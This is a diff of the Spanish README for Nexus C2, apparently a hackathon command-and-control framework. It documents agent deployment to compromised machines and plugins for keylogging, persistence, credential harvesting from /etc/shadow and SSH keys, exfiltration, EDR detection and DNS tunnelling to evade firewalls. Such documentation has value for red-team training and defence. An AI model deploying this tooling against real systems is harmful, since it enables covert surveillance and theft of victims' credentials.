@@ -6,7 +6,7 @@ Framework de Command & Control desarrollado para la **Hackathon Aligo — Defens
 
 ## Descripción
 
-Nexus C2 es un sistema de comando y control con protocolo binario propio, cifrado de extremo a extremo y panel web integrado. Permite controlar múltiples agentes de forma simultánea desde un navegador, ejecutar comandos de shell, y lanzar plugins especializados de reconocimiento, persistencia, exfiltración y evasión.
+Nexus C2 es un sistema de comando y control con protocolo binario propio, cifrado de extremo a extremo y panel web integrado. Permite controlar múltiples agentes de forma simultánea desde un navegador, ejecutar comandos shell, lanzar plugins especializados, visualizar la ubicación geográfica de los agentes en un mapa en tiempo real y consultar un asistente de inteligencia artificial integrado.
 
 ---
 
@@ -36,11 +36,13 @@ SERVIDOR C2 — broker async (aiohttp)  ←  Panel web integrado en GET /
 - **Cifrado autenticado** — ChaCha20-Poly1305 (AEAD) con nonce por contador
 - **Múltiples transportes** — HTTP polling, WebSocket persistente, túnel DNS (UDP :5354)
 - **Panel web integrado** — servido directamente por el servidor C2 en `GET /`
-- **Sistema de plugins** — extensible con prefijo `!`, whitelist de seguridad
+- **Sistema de plugins** — extensible con prefijo `!`
 - **Beaconing con jitter** — patrón de tráfico no determinista
 - **Navegación de directorios persistente** — `cd` mantiene estado entre comandos
-- **Vista de agentes** — muestra usuario, hostname y OS de cada máquina infectada
-- **Exfiltración de archivos** — endpoint `/exfil` con visualizador en el panel
+- **Vista de agentes** — muestra usuario, hostname y OS en tiempo real
+- **Mapa de equipos vulnerados** — geolocalización de agentes en mapa mundial interactivo
+- **NexusAI** — asistente de inteligencia artificial integrado con fallback multi-modelo
+- **Exfiltración de archivos** — endpoint `/exfil` con almacenamiento en servidor
 
 ---
 
@@ -49,6 +51,7 @@ SERVIDOR C2 — broker async (aiohttp)  ←  Panel web integrado en GET /
 ```
 ├── protocol.py              # Codec, handshake, criptografía (compartido agente/servidor)
 ├── requirements.txt         # Dependencias del servidor
+├── .env.example             # Variables de entorno necesarias (copiar a .env)
 ├── server/
 │   └── broker.py            # Servidor C2 async + panel web (HTML embebido)
 ├── agent/
@@ -71,7 +74,7 @@ SERVIDOR C2 — broker async (aiohttp)  ←  Panel web integrado en GET /
 │   ├── build_package.sh     # Genera el paquete del agente listo para desplegar
 │   ├── install.sh           # Instalador del agente en la máquina vulnerada
 │   ├── config.env           # IP del servidor C2 y transporte
-│   ├── requirements-agent.txt  # Dependencias del agente (sin aiohttp)
+│   ├── requirements-agent.txt
 │   └── INSTALL.md           # Guía de despliegue paso a paso
 └── docs/
     ├── Nexus_Documentacion_Tecnica.md
@@ -83,42 +86,91 @@ SERVIDOR C2 — broker async (aiohttp)  ←  Panel web integrado en GET /
 
 ## Instalación
 
-### Servidor C2
+### 1. Clonar el repositorio
 
 ```bash
 git clone https://github.com/Danieldlr13/Command-and-Control-C2.git
 cd Command-and-Control-C2
 pip install -r requirements.txt
+```
+
+### 2. Configurar variables de entorno
+
+```bash
+cp .env.example .env
+# Editar .env con tus API keys
+```
+
+Variables disponibles:
+
+| Variable | Requerida | Descripción |
+|----------|-----------|-------------|
+| `GEMINI_API_KEY` | Recomendada | API key de Google AI Studio para NexusAI |
+| `OPENROUTER_API_KEY` | Recomendada | API key de OpenRouter (fallback de NexusAI) |
+| `OPENROUTER_MODEL` | Opcional | Modelo de fallback (default: `nvidia/nemotron-3-super-120b-a12b:free`) |
+| `NEXUS_API_KEY` | Opcional | Protege el panel con autenticación |
+| `NEXUS_ALLOW_CLEAR` | Opcional | Permite beacons sin cifrar para debug (`0` por defecto) |
+| `NEXUS_DNS_PORT` | Opcional | Puerto del túnel DNS (`5354` por defecto) |
+
+### 3. Iniciar el servidor
+
+```bash
+source .env
 python3 -m server
 ```
 
-El servidor escucha en `0.0.0.0:8080`. El panel web está disponible en `http://localhost:8080`.
+El panel web queda disponible en `http://localhost:8080`.
 
-### Agente (máquina vulnerada)
+### 4. Conectar el agente (máquina vulnerada)
 
-**Opción A — despliegue rápido desde el servidor:**
+**Opción A — despliegue rápido:**
 
 ```bash
-# 1. Editar la IP del servidor C2
+# Editar IP del servidor
 nano deploy/config.env
 
-# 2. Generar paquete
+# Generar paquete y copiar a la máquina objetivo
 ./deploy/build_package.sh
-
-# 3. Copiar a la máquina vulnerada
 scp -r nexus-agent/ usuario@<IP>:~/nexus-agent
 
-# 4. En la máquina vulnerada
+# En la máquina vulnerada
 cd ~/nexus-agent && ./install.sh
 ```
 
-**Opción B — desde el repo (lab local):**
+**Opción B — laboratorio local:**
 
 ```bash
-NEXUS_SERVER=http://<IP_SERVIDOR>:8080 \
+NEXUS_SERVER=http://<IP>:8080 \
 NEXUS_SERVER_PUB=$(cat server_pub.hex) \
 python3 -m agent
 ```
+
+---
+
+## Panel web
+
+El panel es una Single Page App servida por el propio servidor C2 en `GET /`. No requiere build ni framework externo.
+
+### Pestaña Resultados
+- Lista de agentes con **usuario**, **hostname** y **OS** detectados automáticamente
+- Terminal por agente con historial de comandos (↑/↓)
+- Barra de plugins por OS (Linux / Windows) con botones de acción rápida
+- Visualizador de resultados con exit code y timestamps
+- Indicador visual de latencia de beacon
+
+### Pestaña Equipos Vulnerados
+- Mapa mundial interactivo con tema oscuro (Leaflet + CartoDB Dark Matter)
+- Cada agente aparece como un **pin verde pulsante** en su ubicación geográfica real
+- Geolocalización automática via ip-api.com al momento de conexión
+- Agentes en red local (LAN) se ubican en la sede del equipo
+- Clic en el pin muestra: usuario, hostname, OS, ciudad, país, IP y estado
+
+### NexusAI (burbuja 🤖)
+- Asistente de IA integrado accesible desde cualquier pestaña
+- Conoce toda la arquitectura, plugins y protocolo de Nexus C2
+- Solo responde preguntas sobre el sistema (rechaza temas fuera de scope)
+- Cadena de fallback automática: Gemini 2.5 Flash Lite → 4 modelos OpenRouter
+- Si todos los proveedores fallan, muestra mensaje neutral sin alertar al operador
 
 ---
 
@@ -128,48 +180,33 @@ python3 -m agent
 |--------|-------------|-----|
 | `!sysinfo` | Info completa del sistema: OS, CPU, RAM, red, disco | Todos |
 | `!screenshot` | Captura pantalla y la exfiltra automáticamente al C2 | Todos |
-| `!keylog start\|dump\|stop` | Keylogger en background (pynput / evdev fallback Wayland) | Todos |
-| `!persist` | Instala persistencia: crontab → systemd → ~/.bashrc (Linux) / registry (Windows) | Todos |
-| `!exfil <ruta>` | Sube un archivo al servidor C2. Máx 50 MB | Todos |
+| `!keylog start\|dump\|stop` | Keylogger en background | Todos |
+| `!persist` | Instala persistencia: crontab → systemd → ~/.bashrc / registry | Todos |
+| `!exfil <ruta>` | Sube un archivo al servidor C2 | Todos |
 | `!download <url> <dest>` | Descarga desde internet a la máquina vulnerada | Todos |
-| `!cat <ruta>` | Lee archivos o lista directorios. `--hex` para binarios | Todos |
+| `!cat <ruta>` | Lee archivos o lista directorios | Todos |
 | `!clip read` | Lee el portapapeles de la víctima | Todos |
 | `!clip write <texto>` | Escribe en el portapapeles de la víctima | Todos |
-| `!nmcli [wifi\|saved\|passwords\|ifaces]` | Reconocimiento de red via NetworkManager | Linux |
+| `!nmcli [wifi\|saved\|passwords\|ifaces]` | Reconocimiento de red WiFi | Linux |
 | `!mimikatz` | Harvesting: historial shell, SSH keys, tokens cloud, /etc/shadow | Linux |
 | `!unhook` | Detecta LD_PRELOAD, tracers, hooks en memoria y procesos AV/EDR | Linux |
-| `!notify <mensaje>` | Muestra un mensaje en pantalla de la víctima en tiempo real | Todos |
+| `!notify <mensaje>` | Muestra un mensaje en pantalla de la víctima | Todos |
 
 Los comandos sin prefijo `!` se ejecutan directamente como shell. `cd` mantiene el directorio entre comandos.
 
 ---
 
-## Panel web
-
-El panel es una Single Page App servida por el propio servidor C2 en `GET /`. No requiere build ni framework externo.
-
-**Funcionalidades:**
-- Lista de agentes con **usuario**, **hostname** y **OS** detectados automáticamente
-- Terminal por agente con historial de comandos (↑/↓)
-- Barra de plugins por OS (Linux / Windows) con botones de acción rápida
-- Shell rápido con comandos frecuentes por plataforma
-- Visualizador de archivos exfiltrados
-- Indicador visual de latencia de beacon (jitter bar)
-- Modal de ayuda con referencia completa de plugins
-
----
-
 ## Protocolo
 
-| TYPE | Nombre  | Dirección        | Descripción |
-|------|---------|------------------|-------------|
+| TYPE | Nombre  | Dirección | Descripción |
+|------|---------|-----------|-------------|
 | 0x01 | HELLO   | agente → servidor | Handshake: clave pública X25519 efímera |
 | 0x02 | WELCOME | servidor → agente | Clave servidor + session_id |
 | 0x03 | BEACON  | agente → servidor | Latido con agent_id, hostname, username, OS |
 | 0x04 | TASK    | servidor → agente | Comando con task_id UUID |
 | 0x05 | RESULT  | agente → servidor | stdout + stderr + exit_code |
 | 0x06 | NOP     | servidor → agente | Sin tareas pendientes |
-| 0x07 | ERROR   | ambos             | Error de protocolo |
+| 0x07 | ERROR   | ambos | Error de protocolo |
 
 ---
 
@@ -185,11 +222,11 @@ El panel es una Single Page App servida por el propio servidor C2 en `GET /`. No
 
 ## Transportes
 
-| Transporte | Configuración | Descripción |
-|------------|--------------|-------------|
+| Transporte | Variable | Descripción |
+|------------|----------|-------------|
 | HTTP | `NEXUS_TRANSPORT=http` | Polling sobre HTTP POST (default) |
 | WebSocket | `NEXUS_TRANSPORT=ws` | Conexión persistente, menor latencia |
-| DNS | `NEXUS_TRANSPORT=dns` | Túnel DNS sobre UDP :5354 |
+| DNS | `NEXUS_TRANSPORT=dns` | Túnel DNS sobre UDP :5354 para evadir firewalls |
 
 ---
 
@@ -207,8 +244,8 @@ cryptography>=40.0
 requests>=2.31
 pynput>=1.7
 mss>=9.0
-evdev>=1.6          # solo Linux (keylogger Wayland)
-Pillow>=9.0         # solo Windows (screenshot)
+evdev>=1.6       # solo Linux (keylogger Wayland)
+Pillow>=9.0      # solo Windows (screenshot)
 ```
 
 ---
